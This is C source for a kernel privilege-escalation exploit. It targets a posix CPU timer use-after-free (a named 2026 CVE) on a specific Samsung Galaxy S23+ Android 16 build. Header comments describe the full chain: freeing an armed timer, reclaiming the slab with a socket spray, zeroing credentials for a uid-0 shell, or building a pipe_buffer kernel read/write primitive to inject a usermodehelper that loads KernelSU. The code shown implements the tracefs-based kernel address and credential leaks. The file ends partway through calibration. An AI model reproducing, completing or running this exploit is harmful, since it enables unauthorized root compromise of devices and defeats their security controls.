/*
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 * Target : Samsung SM-S9160 (dm2q), Galaxy S23+ China, Snapdragon 8 Gen 2
 * Kernel : 5.15.189-android13-8-3251900-abS9160ZCS8FZJ1
 * Build  : BP4A.251205.006.S9160ZCS8FZJ1 / Android 16 / One UI 8.5
 * SELinux: Enforcing
 * Patches: CVE-2026-98260 cleanup is still in its late (vulnerable)
 *          position in begin_new_exec(), after exec_mmap().
 *
 * Ported from the 6.1.162 e1s profile.  Every address and struct offset was
 * re-derived from this image's .symtab, BTF and disassembly; the 5.15
 * task_struct/cred/workqueue/pipe layouts differ from 6.1 and live in
 * offsets.h.
 *
 * Trigger difference from 6.1 (important):
 *   6.1 aborts exec by racing a SIGKILL against a killable exec_mmap()
 *   lock.  This 5.15 kernel takes signal->exec_update_lock with
 *   down_write_killable() but the lock is uncontended, and the following
 *   mmap_read_lock(old_mm) is uninterruptible, so the 6.1 killer always
 *   loses and the late posix_cpu_timers_exit() cleanup runs.  Instead a
 *   CLONE_VM helper crashes with RLIMIT_CORE unlimited after de_thread:
 *   do_coredump() sets old_mm->core_state, exec_mmap() sees it and returns
 *   -EINTR, begin_new_exec() skips the late cleanup, and exit_itimers()
 *   frees the armed CPU timer while it is still queued.  A paced socket
 *   spray reclaims the freed order-1 posix_timers_cache slab, and the
 *   zombie's release_task()/posix_cpu_timers_exit() performs the
 *   controlled rb_erase write.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake / umhpipe
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     page, or build the pipe_buffer read/write primitive and inject a
 *     call_usermodehelper_exec_work item.  The UMH helper execs the
 *     /system/bin/logcat bind-mounted ksud late-load (KDP-safe).
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 *
 * Safe diagnostics (no plant, no kernel writes):
 *   ids     probe the tracefs event ids only
 *   probe   measure the SLUB discard rate of a batch timer free and the
 *           allocation order that carries an 8 KiB AF_UNIX write (i.e. our
 *           payload carrier); run this first on a new build
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <grp.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <dirent.h>

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 4
/*
 * Spray unit.  8192 is not arbitrary: unix_stream_sendmsg computes
 *   data_len = min(size, round_up(max(0, size - 3712), 4096))
 * and hands that to sock_alloc_send_pskb() as the frag length, so 8192 gives
 * data_len = 8192, header = 0 and get_order(8192) = 1 -- one order-1 page
 * frag with the whole payload at offset 0, which is what the reclaim needs.
 * <= 3712 goes linear (kmalloc, order 2/3) and 16384 would ask for order 2,
 * so do not tune this number without redoing the hit check.
 */
#define SOCKBUF 8192
/* Which cred allocation from the exec trace is the live one (0=first). */
#define CRED_ALLOC_PICK 0

/* All kernel-build-specific constants (sites, cache sizes, struct offsets,
 * link-time symbols) live in offsets.h; only exploit tuning stays here. */
#include "offsets.h"

/* (selinux_state / panic_on_warn / workqueue-UMH constants: offsets.h) */
/* (umh struct layouts + ROOT_UMH_* page slots: offsets.h) */
/* (DEFEX creds_hash, cred/task field offsets, init_* symbols: offsets.h) */

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552
/* Contents of the marker page, used to verify a traced pfn before it is
 * ever installed as pipe->bufs (see pipe_verify_marker). */
#define MARK_MAGIC 0x1122334455667788ULL
/* Extra magics at fixed offsets in the same page: one 4 KiB read then says
 * whether the pfn is right (all three present) or only the offset is wrong. */
#define MARK_MAGIC2 0x8877665544332211ULL  /* at +0x800 */
#define MARK_MAGIC3 0xa1b2c3d4e5f60718ULL  /* at +0xff8 */

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_burst2;
static _Atomic unsigned long g_locker_iters;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_slide_set;
static int g_held;
/* Victims left unreaped by a failed repair: their task_struct stays alive
 * until init reaps the zombie.  These are used by safe_unlink_held() to
 * empty the CPU-timer queues before parking. */
#define MAX_HELD 64
static unsigned long long g_held_task[MAX_HELD];
static int g_held_pid[MAX_HELD];
static int g_held_n;
static int g_pre_hit;
static _Atomic int g_core_go;
static int g_safe_done;
static int g_safe_rfd = -1, g_safe_wfd = -1;
static unsigned char *g_safe_page;
static void safe_unlink_held(void);
static void hold_victim(pid_t pid, unsigned long long task);
/*
 * True while the root child runs with task->cred pointing into the fake
 * pool page: that page must not be freed (park_forever skips the drain).
 */
static int g_cred_live;
static int g_fake_stage;
static int g_pipe_fake;
static int g_child_pid;
static int g_child_go_fd = -1;
static unsigned long long g_child_task;
static int g_umh_stage;
static unsigned g_t_page_alloc, g_t_page_free;
/* SAMTIMER_DUMP_PFN: log every mm_page_alloc / mm_page_free record whose pfn
 * matches the victim slab, so the reclaim timeline (free -> alloc) is visible
 * instead of just the one-bit `burst hit`.  Diagnostic only. */
static int g_dump_pfn;

/* pipe_buffer kernel r/w primitive + UMH injection state. */
static unsigned long long g_pipe_addr;        /* leaked pipe_inode_info */
static unsigned long long g_pipe_bufs;        /* its original bufs array */
static unsigned long long g_pipe_target_page; /* vmemmap struct page * */
static unsigned int g_pipe_target_off;
static int g_pipe_self;
static int g_pipe_write;
/* Set once the bootstrap merge moved pipe->bufs onto our page: from then on
 * slot 0 (which overlaps the rb node) may also be filled, because the node is
 * no longer dereferenced.  Until then slot 0 must stay untouched. */
static int g_bufs_ours;
static int g_umh_dry;
/* True while pipe->bufs may point into the *keep* pool (g_fpool): a mode-6
 * plant points it at the reclaimed slab page, which lives in one of that
 * pool's skb payload pages.  Only the keep pool is affected -- g_pool stays
 * drainable, so the repair plants that follow a miss can release their
 * spray again (they used to be blocked too, up to 15 full sprays ~= 1.9 GiB). */
static int g_keep_bufs;
static int g_pipe_restored;
/* Running kernel image phys base (unslid base + slide) and DRAM phys
 * base; see offsets.h. */
static unsigned long long g_kimage_phys;
/*
 * Size of the RAM window the linear map is actually backed by.  The map
 * spans 64 GiB of VA, but reading an address whose pfn is past the end of
 * DRAM makes spage_of_linear() point at an unmapped struct page and the
 * copy faults *in kernel mode*.  That is a hard reset with no log line, and
 * it is what a wrong KERNEL_PHYS_CANDIDATE produced: the first 8-byte read
 * returns a plausible linear pointer from some other page, the second read
 * uses it and dies.  Any address inside the real DRAM is safe to read.
 */
static unsigned long long g_linear_span = 8ULL << 30;
static unsigned long long g_linear_lo;   /* = g_base + memstart (PAGE_OFFSET) */
static unsigned long long g_memstart = MEMSTART_ADDR;

static void logf(const char *fmt, ...);
static int user_pipe_read(int fd, unsigned char *page,
                          unsigned long long addr, void *buf, size_t len);
static int user_pipe_write(int fd, unsigned char *page,
                           unsigned long long addr, const void *buf,
                           size_t len);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    /* [+ms] elapsed-since-first-log prefix: makes the per-stage cost
     * (leak, each plant, each repair, late-load) visible in the log so
     * the slow spots can be measured instead of guessed. */
    static struct timespec t0;
    struct timespec now;
    va_list ap;

    clock_gettime(CLOCK_MONOTONIC, &now);
    if (!t0.tv_sec)
        t0 = now;
    long long ms = (long long)(now.tv_sec - t0.tv_sec) * 1000LL +
                   (long long)(now.tv_nsec - t0.tv_nsec) / 1000000LL;
    printf("[+%5lld.%03llds] ", ms / 1000LL, ms % 1000LL);

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    /*
     * The per-cpu trace buffer defaults to a few kB and the kmem events
     * flood it in milliseconds on a busy system, which starves every scan
     * (discover_page_types sees partial alloc/free pairs).  Grow it first
     * so the payload is self-contained instead of relying on the app to
     * have done it.
     */
    wr(TR "/buffer_size_kb", "8192\n");
    /*
     * Event triggers persist in tracefs across runs (and even reboots of
     * the tracing state), and re-registering a trigger that already exists
     * fails with EEXIST.  A leftover "disable_event:kmem:kmalloc" from an
     * earlier run keeps firing on rss_stat and silently turns the pipe
     * leak blind, so remove every form first (ignore failures), then
     * register the enables.  The bare syntax is correct; the ":unlimited"
     * suffix is just how tracefs displays the parsed trigger count.
     */
    static const char *evs[] = {
        "!disable_event:kmem:kmalloc\n",
        "!disable_event:kmem:kmem_cache_alloc\n",
        "!disable_event:kmem:kmem_cache_alloc_node\n",
        "!disable_event:kmem:mm_page_free\n",
        "!disable_event:kmem:mm_page_alloc\n",
        "!enable_event:kmem:kmem_cache_alloc\n",
        "!enable_event:kmem:kmem_cache_alloc_node\n",
        "!enable_event:kmem:mm_page_free\n",
        "!enable_event:kmem:mm_page_alloc\n",
        "!enable_event:kmem:kmalloc\n",
        "enable_event:kmem:kmem_cache_alloc\n",
        /* dup_task_struct() allocates via kmem_cache_alloc_node; without
         * this event the child task_struct address is never traced. */
        "enable_event:kmem:kmem_cache_alloc_node\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

/*
 * kmem:kmalloc is deliberately not enabled globally: it fires for every
 * kmalloc on the system and floods the trace buffer, which buries the
 * page events discover_page_types needs.  The pipe leak wants it for a
 * few milliseconds only (pipe_inode_info is a kmalloc object).  Switching
 * between the enable and disable trigger forms needs the other form
 * removed first -- re-registering conflicts with EEXIST.
 */
static void set_pipe_events(int on)
{
    const char *want = on ? "enable_event:kmem:kmalloc\n"
                          : "disable_event:kmem:kmalloc\n";

    /*
     * Switching between the enable and disable trigger forms needs the
     * other form removed first (re-registering conflicts with EEXIST),
     * and the whole dance is verified from the trigger file: a leftover
     * trigger from a killed run silently keeps kmalloc off and the pipe
     * leak then sees nothing.
     */
    for (int t = 0; t < 3; t++)
    {
        FILE *f;
        char line[128];
        int ok = 0;

        wr(TR "/events/kmem/rss_stat/trigger",
           on ? "!disable_event:kmem:kmalloc\n"
              : "!enable_event:kmem:kmalloc\n");
        wr(TR "/events/kmem/rss_stat/trigger",
           on ? "!enable_event:kmem:kmalloc\n"
              : "!disable_event:kmem:kmalloc\n");
        wr(TR "/events/kmem/rss_stat/trigger", want);
        f = fopen(TR "/events/kmem/rss_stat/trigger", "r");
        if (f)
        {
            while (fgets(line, sizeof(line), f))
                if (!strncmp(line, want, strlen(want) - 1))
                    ok = 1;
            fclose(f);
        }
        if (ok)
        {
            /*
             * The trigger only takes effect on the next rss_stat event;
             * force one so the enable/disable lands before the traced
             * window instead of somewhere inside it.
             */
            void *q = mmap(NULL, PAGE, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (q != MAP_FAILED)
            {
                *(volatile char *)q = 1;
                munmap(q, PAGE);
            }
            usleep(1000);
            return;
        }
        logf("[!] kmalloc trigger %s not registered, retry %d\n",
             on ? "enable" : "disable", t + 1);
        usleep(20000);
    }
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    /*
     * Identify the k_itimer allocation site dynamically.  The KASLR slide on
     * this kernel has sub-2MB granularity, so the low 21 bits of the call
     * site are not constant across boots and must not be compared against a
     * hard-coded value.  Instead, the target allocations (CLOCK_*_CPUTIME
     * timer_create) all come from a single call site (do_timer_create), so
     * the dominant site among this pid's TIMER_ALLOC kernel allocations is
     * that call site.
     */
    unsigned long long cand_site[8];
    int cand_cnt[8];
    int nc = 0;

    for (int k = 0; k < 8; k++)
        cand_site[k] = 0, cand_cnt[k] = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;
        int f = 0;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        ptr = u64(b, i + 8);
        if (u64(b, i + 16) != TIMER_ALLOC ||
            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
            continue;
        for (int k = 0; k < nc; k++)
            if (cand_site[k] == site)
            {
                cand_cnt[k]++;
                f = 1;
                break;
            }
        if (!f && nc < 8)
        {
            cand_site[nc] = site;
            cand_cnt[nc] = 1;
            nc++;
        }
    }
    if (!nc)
        return 0;
    {
        int best = 0;

        for (int k = 1; k < nc; k++)
            if (cand_cnt[k] > cand_cnt[best])
                best = k;
        unsigned long long dom = cand_site[best];
        int cnt = 0;

        for (size_t i = 8; i + 32 <= n; i += 4)
        {
            unsigned long long site, ptr;

            if (u32(b, i - 4) != (unsigned)pid)
                continue;
            site = u64(b, i);
            if (site != dom)
                continue;
            ptr = u64(b, i + 8);
            if (u64(b, i + 16) != TIMER_ALLOC ||
                u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
                continue;
            if (!cnt && first_site)
                *first_site = site;
            if (cnt < max)
                out[cnt++] = ptr;
        }
        return cnt;
    }
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    struct ro_rec
    {
        unsigned long long site, ptr;
    } ro[16];
    int nro = 0, found = 0;
    unsigned long long normal_site = 0, normal_ptr = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        req = u64(b, i + 8);
        alloc = u64(b, i + 16);
        if (!is_kernel_ptr(ptr))
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;

        if (req == CRED_REQ && alloc == CRED_ALLOC)
        {
            logf("  [credscan] normal cred=%#llx site_low=%#llx (n=%d)\n",
                 ptr, site & 0x1fffff, found);
            if (!normal_ptr)
            {
                normal_site = site;
                normal_ptr = ptr;
            }
            found++;
        }
        else if (alloc == CRED_RO_ALLOC)
        {
            /*
             * bytes_req for a dedicated cache is the object size on most
             * builds (0xd0 here) but some trace paths report the slab size
             * or zero.  The 0x100 bucket plus the prepare_ro_creds site is
             * the reliable pair; keep req only for the log.
             */
            logf("  [credscan] ro-cred=%#llx req=%#llx site_low=%#llx "
                 "(ro=%d)\n", ptr, req, site & 0x1fffff, nro);
            if (nro < (int)(sizeof(ro) / sizeof(ro[0])))
            {
                ro[nro].site = site;
                ro[nro].ptr = ptr;
                nro++;
            }
            found++;
        }
    }

    if (!found)
        return 0;
    if (normal_ptr)
    {
        *site_out = normal_site;
        *ptr_out = normal_ptr;
    }
    /*
     * Samsung 5.15: commit_creds() -> prepare_ro_creds() copies the normal
     * cred into cred_jar_ro and installs that object as task->cred.  Prefer
     * the first ro-cred whose allocation site matches prepare_ro_creds plus
     * the slide learned from the normal prepare_creds site; fall back to the
     * first ro object, then to the normal cred.
     */
    if (nro)
    {
        unsigned long long slide = normal_ptr
            ? normal_site - CRED_SITE_STATIC
            : 0;
        /*
         * 5.15: prepare_ro_creds() returns x19, the FIRST cred_jar_ro
         * allocation of that call (`mov x0, x19; ret` at
         * 0xffffffc0091b66e0), and commit_creds() installs it as both
         * real_cred and cred.  commit_creds() can run more than once
         * during exec (normal commit, then DEFEX/KDP re-commit), and each
         * call allocates [x19, x24, x25].  The LIVE object is therefore
         * the first object of the LAST call: keep the last ro candidate
         * matching prepare_ro_creds' first-allocation site.  This is the
         * 5.15 form of RiosWesley's "last KDP wins".
         */
        int pick = -1;

        for (int i = 0; i < nro; i++)
            if (normal_ptr && ro[i].site == RO_CRED_SITE_STATIC + slide)
                pick = i;
        if (pick < 0)
            pick = 0;
        *ptr_out = ro[pick].ptr;
        logf("  [credscan] live cred=ro%d/%d ptr=%#llx (normal=%#llx "
             "slide=%#llx)\n", pick, nro, ro[pick].ptr, normal_ptr, slide);
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out,
                            unsigned long long expect_site)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        /*
         * The KASLR slide on this kernel has 64KB granularity, so a
         * hard-coded low-21-bit filter never matches.  Match the exact
         * runtime call site instead: dup_task_struct's
         * kmem_cache_alloc_node return address plus this boot's slide.
         */
        if (expect_site && site != expect_site)
            continue;
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        /* task_struct_cachep object_size is sizeof(struct task_struct),
         * 0x12c0; it is 64-byte aligned so bytes_alloc is the same. */
        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES)
            continue;
        *out = ptr;
        found++;
    }
    return found;
}

/*
 * pipe_inode_info leak for the pipe_buffer r/w primitive: after pipe() the
 * kmem trace shows kmalloc(pipe_inode_info) (req 0xb8 / alloc 0xc0) and
 * the bufs array (req 0x280).  Both addresses are needed: the plant
 * repoints pipe->bufs, and the restore writes the original back.
 */
static void scan_pipe_alloc(const unsigned char *b, size_t n, int pid)
{
    unsigned long long last_small = 0, last_req = 0, last_alloc = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long ptr, req, alloc, site;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        req = u64(b, i + 8);
        alloc = u64(b, i + 16);
        site = u64(b, i - 8);
        if (!is_kernel_ptr(ptr))
            continue;
        /*
         * alloc_pipe_info() allocates struct pipe_inode_info first and the
         * pipe_buffer array second.  The inode's kmalloc bucket differs
         * across 5.15 builds (0xc0 here is not always emitted as 0xb8/0xc0
         * by the trace), so remember the last small allocation and attach
         * it to the bufs record that follows.
         */
        if (req < 0x280 && alloc >= 0xc0 && alloc <= 0x400)
        {
            last_small = ptr;
            last_req = req;
            last_alloc = alloc;
        }
        else if (req == 0x280)
        {
            g_pipe_bufs = ptr;
            logf("[pipeleak] bufs=%#llx alloc=%#llx site=%#llx\n",
                 ptr, alloc, site);
            if (!g_pipe_addr && last_small)
            {
                g_pipe_addr = last_small;
                logf("[pipeleak] info(prev)=%#llx req=%#llx "
                     "alloc=%#llx\n", last_small, last_req, last_alloc);
            }
        }
    }
}

/* Order-0 mm_page_alloc pfns for this pid, in trace order. */
static int scan_page_alloc_pfns(const unsigned char *b, size_t n, int pid,
                                unsigned long long *out, int max)
{
    int found = 0;

    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        unsigned long long pfn;
        unsigned int order;
        int dup = 0;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        order = u32(b, i + 8);
        if (order != 0)
            continue;
        /*
         * The marker is an anonymous user page fault: GFP_HIGHUSER_MOVABLE
         * carries __GFP_MOVABLE (0x8).  Page-table pages (GFP_PGTABLE_USER)
         * and pipe pages (GFP_KERNEL_ACCOUNT) do not, so this filter
         * identifies the marker from the trace alone, without a plant.
         */
        if (!(u32(b, i + 12) & 0x8))
            continue;
        pfn = u64(b, i);
        if (pfn >= 0x1000000ULL) /* 64 GB physical: includes high RAM */
            continue;
        for (int k = 0; k < found; k++)
            if (out[k] == pfn)
                dup = 1;
        if (dup)
            continue;
        logf("[pipepfn] pfn=%#llx order=%u idx=%d\n", pfn, order, found);
        if (found < max)
            out[found++] = pfn;
    }
    return found;
}

/*
 * The kernel image's physical load address (unslid base + slide) is a
 * bootloader constant; see offsets.h.  It is validated read-only by the
 * umh dry-run candidate loop instead of being parsed at runtime.
 */

/* vmemmap struct page pointer for a linear-map address. */
static unsigned long long spage_of_linear(unsigned long long addr)
{
    unsigned long long phys = addr - g_base;
    unsigned long long pfn = phys >> 12;

    return VMEMMAP_BASE + (pfn - (g_memstart >> 12)) * STRUCT_PAGE_SIZE;
}

/* Linear-map alias of a kernel-image symbol (slide included via iomem). */
static unsigned long long alias_of_kimg(unsigned long long sym)
{
    return g_base + g_kimage_phys + (sym - KERNEL_VA_BASE);
}

/*
 * One pass over mm_page_free records answering both questions the plant asks:
 *
 *   want_free   the victim slab's page really went back to the buddy (the
 *               erase can only fire on a page whose node we reclaimed);
 *   order1      how many order-1 pages the victim's own do_exit returned to
 *               the buddy.  This is the SLUB "discard" signal the vivo GKI
 *               port measured directly (3000 thread timers deleted -> 91/97
 *               order-1 frees, ~94%): if it stays near zero the whole timer
 *               batch never left the partial list, and the spray can never
 *               win no matter how much it writes.
 */
struct free_info
{
    int want_free;
    int order1;      /* order-1 frees at slab_pfn attributed to etid */
    int order1_any;  /* ... from any task: RCU callbacks free the k_itimer */
};

static void scan_free_records(const unsigned char *b, size_t n, int pid,
                              unsigned long long pfn, struct free_info *fi)
{
    for (size_t i = 8; i + 12 <= n; i += 4)
    {
        unsigned long long fpfn = u64(b, i);
        int order = (int)u32(b, i + 8);

        if ((u32(b, i - 8) & 0xffff) != g_t_page_free)
            continue;
        if (g_dump_pfn && fpfn == pfn)
            logf("[pfn] type=%u free? pid=%d pfn=%#llx order=%d\n",
                 (unsigned)(u32(b, i - 8) & 0xffff),
                 (int)u32(b, i - 4), fpfn, order);
        if (order == 1 && (int)u32(b, i - 4) == pid)
            fi->order1++;
        if (order == 1 && fpfn == pfn)
        {
            fi->order1_any++;
            fi->want_free = 1;
        }
    }
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
